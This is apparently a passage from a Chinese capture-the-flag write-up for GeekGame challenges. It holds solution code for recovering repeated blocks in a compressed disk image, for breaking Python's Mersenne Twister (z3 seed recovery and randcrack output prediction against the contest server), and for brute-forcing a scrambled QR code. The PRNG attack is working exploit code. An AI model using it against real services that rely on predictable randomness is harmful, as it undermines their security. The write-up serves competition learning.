		if (cnt <= 0) return 0;
		unsigned long long z = 0;
		cc++;
		if(cc == 256 * 1024) {
			ticks++;
			cc = 0;
			fprintf(stderr, "%d/%d", ticks, 8*1024);
		}
		for (int i =0 ;i<4096/8;i++) {
			z |= x[i];
		}
		if(!z)continue;
		for (int i =0 ;i<cnt;i++) if(buf[i]) putchar(buf[i]);
	}
}
```

不摆了，做一下后两问，简而言之是有循环节可以被找到

用SAM得出本质不同串，筛一下最像循环节的东西吧

```c
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <vector>
#include <fcntl.h>
#include <unistd.h>
using namespace std;
typedef unsigned int uint;
typedef long long ll;
const int N=20001000;
struct Sam{
	Sam*son[2],*par;
	uint dep;
	uint size;
	vector<Sam*>pSon;
}pool[2*N];
int cnt=0;
Sam* newSam(uint dep){
	Sam* t=pool+(cnt++);
	t->par=0;
	memset(t->son,0,sizeof(t->son));
	t->dep=dep;
	t->size=0;
	t->pSon.clear();
	return t;
}
Sam*root;
Sam*extendSam(Sam*last,char ch){
	if(last->son[ch]&&last->dep+1==last->son[ch]->dep)return last->son[ch];
	Sam*n=newSam(last->dep+1);n->size=1;//endPtr
	for(;last&&!last->son[ch];last=last->par)last->son[ch]=n;
	if(!last)n->par=root;else{
		Sam*q=last->son[ch];
		if(q->dep==last->dep+1) n->par=q;else{
			Sam*nq=newSam(last->dep+1);
			nq->par=q->par;
			memcpy(nq->son,q->son,sizeof(q->son));
			q->par=nq;n->par=nq;
			for(;last&&last->son[ch]==q;last=last->par)last->son[ch]=nq;
		}
	}
	return n;
}
char str[N];
void dfs(Sam*cur){
	for(auto nxt:cur->pSon)dfs(nxt),cur->size+=nxt->size;
}
const size_t read_size = N / 8;
char buf[read_size];
int main(){
    int fd = open("flag2", O_RDONLY);
    read(fd, buf, N / 8);
    close(fd);
    cnt=0;
    root=newSam(0);
    Sam*cur=root;
    int len=read_size*8;
    for(int i=0;i<read_size;i++) {
        for (int j = 0; j < 8; j++) {
            cur=extendSam(cur,(buf[i]>>j)&1);
        }
    }
    for(int i=1;i<cnt;i++)pool[i].par->pSon.push_back(pool+i);
    dfs(root);
    ll ans = 0, loop = 0;
    for(int i=0;i<cnt;i++){
        Sam*cur=pool+i;
        ll size = cur->dep-(cur->par ? cur->par->dep : 0);
        ll occur = cur->size;
        if (occur > 2 && ans < occur * size) {
            ans = occur * size;
            loop = size;
        }
    }
    ll looper_size = 0;
    ll first_size = 0;
    for(int i=0;i<cnt;i++){
        Sam*cur=pool+i;
        ll size = cur->dep-(cur->par ? cur->par->dep : 0);
        ll occur = cur->size;
        if (occur > 2 && occur * size >= ans - size) {
            if (looper_size < size) {
                looper_size = size;
                first_size = read_size * 8 - occur * size;
            } else if (looper_size == size && read_size * 8 - occur * size < first_size) {
                first_size = read_size * 8 - occur * size;
            }
        }
    }
    printf("%lld\n",looper_size);
    printf("%lld\n",first_size);
	return 0;
}
```

再写个删掉循环串的代码

```python
import sys
path = sys.argv[1]
f = open(path, 'rb')
f.seek(0, 2)
start_a = 62000 # flag1
block_size = 32866
start_a = 3253640 # flag2 double
block_size = 3349492
start_a = 62000 # flag2 single
block_size = 32866
start_a = (start_a + block_size) // 8 * 8
start_b = (f.tell() - 1000*1024)* 8

def get_bits(offset, bitsize=2):
  start = offset // 8

  bits = ""
  ptr = offset - (start * 8)
  # warning - endianness!!! we can't naively convert to binary
  # ptr is offset FROM THE END of where we are
  while True:
    end = start + 5*1024
    # print("\trequested", start, end)
    f.seek(start, 0)
    content = f.read(end-start)

    bits = ''.join((f'{a:08b}') for a in content[::-1]) + bits

    while ptr + bitsize <= len(bits):
      yield bits[len(bits)-(ptr + bitsize):len(bits)-ptr]
      ptr += bitsize
    bits = bits[:len(bits)-ptr]
    ptr = 0

    start = end


first_block = next(get_bits(start_a, block_size))
a = 0
b = (start_b - start_a) // block_size
while b-a > 1:
    print("search space:", b-a)
    c = (a + b) // 2
    bits = next(get_bits(start_a + c*block_size, block_size))
    if bits != first_block:
        # after flag
        b = c
    else:
        # before flag
        a = c
    print("found a_loc", a)
    print("found a_pos", start_a + a*block_size)
    a_loc = a

two = open(path + 'x.gz', 'wb')
f.seek(0, 0)
two.write(f.read(start_a // 8))
print('seconding')
deflate = next(get_bits(start_a + a*block_size, block_size * 2))
print('third')
b = b''
pos = len(deflate)
while pos >= 8:
    pos -= 8
    b += bytes([int(deflate[pos:pos+8], 2)])
    # deflate = deflate[:-8]

two.write(b)
```

筛完

```bash
cat flag2x.gz | pigz -d > flag2 # 再解压一遍
./sam
python3 remove_same_chunks.py flag3
cat flag3x.gz | pigz -d > x.out
strings x.out
flag{How_larg3_th3_d1sk_15}
```

## 小章鱼的曲奇

第三问复读一遍init_array(-j后)

```python
from z3 import *
import time
from pwn import *
rr = remote('prob08.geekgame.pku.edu.cn', 10008)
rr.sendlineafter('Please input your token: ', '<token>')
def extract_seed(seed):
    init_key = []
    if isinstance(seed, int):
        while seed != 0:
            init_key.append(seed % 2 ** 32)
            seed //= 2 ** 32
    else:
        init_key = seed
    key = init_key if len(init_key) > 0 else [0]
    keyused = len(init_key) if len(init_key) > 0 else 1
    return key

def random_seed(seed):
    init_key = []
    if isinstance(seed, int):
        while seed != 0:
            init_key.append(seed % 2 ** 32)
            seed //= 2 ** 32
    else:
        init_key = seed
    key = init_key if len(init_key) > 0 else [0]
    keyused = len(init_key) if len(init_key) > 0 else 1
    return init_by_array(key, keyused)

def init_by_array(init_key, key_length):
    N = 624
    s = 19650218
    mt = [0] * N
    mt[0] = s
    for mti in range(1, N):
        if isinstance(mt[mti - 1], int):
            mt[mti] = (1812433253 * (mt[mti - 1] ^ (mt[mti - 1] >> 30)) + mti) % 2 ** 32
        else:
            mt[mti] = (1812433253 * (mt[mti - 1] ^ LShR(mt[mti - 1], 30)) + mti)
    i = 1
    j = 0
    k = N if N > key_length else key_length
    while k > 0:
        if isinstance(mt[i - 1], int):
            mt[i] = ((mt[i] ^ ((mt[i - 1] ^ (mt[i - 1] >> 30)) * 1664525)) + init_key[j] + j) % 2 ** 32
        else:
            mt[i] = ((mt[i] ^ ((mt[i - 1] ^ LShR(mt[i - 1], 30)) * 1664525)) + init_key[j] + j)
        i += 1
        j += 1
        if i >= N:
            mt[0] = mt[N - 1]
            i = 1
        if j >= key_length:
            j = 0
        k -= 1
    for k in range(1, N)[::-1]:
        if isinstance(mt[i - 1], int):
            mt[i] = ((mt[i] ^ ((mt[i - 1] ^ (mt[i - 1] >> 30)) * 1566083941)) - i) % 2 ** 32
        else:
            mt[i] = ((mt[i] ^ ((mt[i - 1] ^ LShR(mt[i - 1], 30)) * 1566083941)) - i)
        i += 1
        if i >= N:
            mt[0] = mt[N - 1]
            i = 1
    mt[0] = 0x80000000
    return mt

def recover_seed(state, print_info=True):
    if print_info:
        print('recover seed...', end=' ')
        start_time = time.time()
    N = 624
    my_seed = [BitVec(f"seed_{i}", 32) for i in range(N)]
    mt = random_seed(my_seed)
    s = Solver()
    for i in range(N):
        s.add(mt[i] == state[i])
    s.check()

    m = s.model()
    my_seed = [m[s].as_long() for s in my_seed]

    my_seed_int = 0
    for s in my_seed[::-1]:
        my_seed_int *= 2**32
        my_seed_int += s
    if print_info:
        print(f'done. {time.time() - start_time}s')
    return my_seed_int
rr.sendlineafter(b'Choose one: ', b'3')
rr.recvuntil(b'<')
t = [int(v, 16) for v in rr.recvuntil(b'>')[:-1].strip().decode().split(',')]
def solve(prob):
    my_seed = extract_seed(prob)
    my_seed += [x - len(my_seed) for x in my_seed]
    my_seed_int = 0
    for s in my_seed[::-1]:
        my_seed_int *= 2**32
        my_seed_int += s
    assert random_seed(prob) == random_seed(my_seed_int)
    return my_seed_int
rr.sendlineafter(b'> ', ','.join(hex(solve(x)) for x in t))
rr.interactive()
```

第一问直接丢randcrack里

```python
a = open('payload2.txt').read().strip()
data = bytes.fromhex(a)
from randcrack import RandCrack
rc = RandCrack()
from struct import *
arr = unpack('<624I', data[:2496])
for i in range(624):
	rc.submit(arr[i])

buffer = pack('<30I', *(rc.predict_getrandbits(32) for _ in range(30)))
t = data[2496:]
print(bytes([a^b for a,b in zip(t,buffer)]))
```

第二问用第三问脚本跑出来的payload丢第一问里。

## 华维码

第一问解决定位吗后爆破余下内容(pyzbar 比 zxing 快不少)

```python
import cv2 # L2
import numpy as np
from PIL import Image

data = []
level = 5
dic = {5:'1', 9:'2'}[level]

for i in range(1, level*level+1):
    pic = cv2.imread(f'{dic}/{i:02}.png') if level == 5 else cv2.imread(f'{dic}/{i}.png')
    dd = []
    for x in range(5):
        cc = []
        for y in range(5):
            cc.append(pic[x*10+5,y*10+5,0] // 255)
        dd.append(cc)
    data.append(dd)

#print(data)
tmpl5 = """
#######_U????????_#######
#_____#_U????????_#_____#
#_###_#_U????????_#_###_#
#_###_#_U????????_#_###_#
#_###_#_U????????_#_###_#
#_____#_U????????_#_____#
#######_#_#_#_#_#_#######
________U????????________
UUUUUU#UU????????UUUUUUUU
??????_??????????????????
??????#??????????????????
??????_??????????????????
??????#??????????????????
??????_??????????????????
??????#??????????????????
??????_??????????????????
??????#?????????#####????
________#???????#___#????
#######_U???????#_#_#????
#_____#_U???????#___#????
#_###_#_U???????#####????
#_###_#_U????????????????
#_###_#_U????????????????
#_____#_U????????????????
#######_U????????????????
""".strip().replace('\r','').splitlines()
tmpl9 = """
#######_U?????????????????????????__#_#######
#_____#_U?????????????????????????_#__#_____#
#_###_#_U?????????????????????????_#__#_###_#
#_###_#_U?????????????????????????_##_#_###_#
#_###_#_U???????????#####?????????###_#_###_#
#_____#_U???????????#___#?????????____#_____#
#######_#_#_#_#_#_#_#_#_#_#_#_#_#_#_#_#######
________U???????????#___#????????????________
UUUUUU#UU???????????#####????????????UUUUUUUU
??????_??????????????????????????????????????
??????#??????????????????????????????????????
??????_??????????????????????????????????????
??????#??????????????????????????????????????
??????_??????????????????????????????????????
??????#??????????????????????????????????????
??????_??????????????????????????????????????
??????#??????????????????????????????????????
??????_??????????????????????????????????????
??????#??????????????????????????????????????
??????_??????????????????????????????????????
????#####???????????#####???????????#####????
????#___#???????????#___#???????????#___#????
????#_#_#???????????#_#_#???????????#_#_#????
????#___#???????????#___#???????????#___#????
????#####???????????#####???????????#####????
??????_??????????????????????????????????????
??????#??????????????????????????????????????
??????_??????????????????????????????????????
??????#??????????????????????????????????????
??????_??????????????????????????????????????
??????#??????????????????????????????????????
??????_??????????????????????????????????????
??????#??????????????????????????????????????
??????_??????????????????????????????????????
____#_#??????????????????????????????????????
_####__??????????????????????????????????????
#__##_#?????????????#####???????????#####????
________#???????????#___#???????????#___#????
#######_U???????????#_#_#???????????#_#_#????
#_____#_U???????????#___#???????????#___#????
#_###_#_U???????????#####???????????#####????
#_###_#_U????????????????????????????????????
#_###_#_U????????????????????????????????????
#_____#_U????????????????????????????????????
#######_U????????????????????????????????????
""".strip().replace('\r','').splitlines()
tmpl = {5:tmpl5,9:tmpl9}[level]

avail = set(range(level*level))
selected = set()

corr = [[-1]*level for _ in range(level)]
coks = [[-1]*level for _ in range(level)]

has_ok = True
while has_ok:
    has_ok = False
    for i in range(level):
        for j in range(level):
            if corr[i][j] != -1:
                continue
            oks = []
            for z in list(avail):
                is_ok = True
                for x in range(5):
                    for y in range(5):
                        cur = tmpl[i*5+x][j*5+y]
                        act = data[z][x][y]
                        if cur == '?':
                            continue
                        if cur == '#' and act != 0:
                            is_ok = False
                            break
                        if cur == '_' and act != 1:
                            is_ok = False
                            break
                    if not is_ok:
                        break
                if is_ok:
                    oks.append(z)
            if len(oks) == 0:
                print('err',i,j)
            elif len(oks) == 1:
                corr[i][j] = oks[0]
                avail.remove(oks[0])
                selected.add(oks[0])
                has_ok = True
            else:
                coks[i][j] = oks

print(corr)
print(coks)
print(avail)
white = np.array([255,255,255], dtype=np.uint8)
gray = np.array([128,128,128], dtype=np.uint8)

def arr_from_corr(corr):
    arr = np.zeros([level*50,level*50,3], dtype=np.uint8)
    for i in range(level):
        for j in range(level):
            if corr[i][j] == -1:
                arr[i*50:i*50+50,j*50:j*50+50] = gray
                continue
            for x in range(5):
                for y in range(5):
                    if data[corr[i][j]][x][y] == 1:
                        arr[i*50+x*10:i*50+x*10+10,j*50+y*10:j*50+y*10+10] = white
    return arr

arr = arr_from_corr(corr)
cv2.imwrite(f'{dic}/out.png', arr)

def make_arr(xx):
    arr = np.zeros([50,50,3], dtype=np.uint8)
    for x in range(5):
        for y in range(5):
            if xx[x][y] == 1:
                arr[x*10:x*10+10,y*10:y*10+10] = white
    return arr

arrs = [make_arr(x) for x in data]

cnts = []
for i in range(level):
    for j in range(level):
        if corr[i][j] != -1:
            continue
        cnts.append((len(coks[i][j]), (i, j)))

cnts = sorted(cnts)
order = [v[1] for v in cnts]
cnt = 0
used = [0]*(level*level)

from pyzbar import pyzbar

def dfs(cur):
    global arr
    if cur == len(order):
        global cnt
        cnt += 1
        if cnt % 100 == 0:
            print(cnt)
        if cnt < 12400 or (cnt > 12500 and cnt < 13500):
            return
        if len(pyzbar.decode(arr)):
            print(corr, pyzbar.decode(arr))
        return
    x, y = order[cur]
    for idx in coks[x][y]:
        if used[idx]:
            continue
        used[idx] = 1
        corr[x][y] = idx
        arr[x*50:x*50+50,y*50:y*50+50] = arrs[idx]
        dfs(cur + 1)
        used[idx] = 0

#arr = arr_from_corr([[18, 5, 7, 9, 15], [23, 8, 17, 16, 4], [3, 11, 0, 19, 1], [22, 20, 21, 24, 2], [13, 10, 14, 6, 12]] )
#cv2.imwrite(f'{dic}/out.png', arr)
dfs(0)
#print(cnt)
# flag{Its-Amazing-I-Love-Puzzle}
```

第二问好难QAQ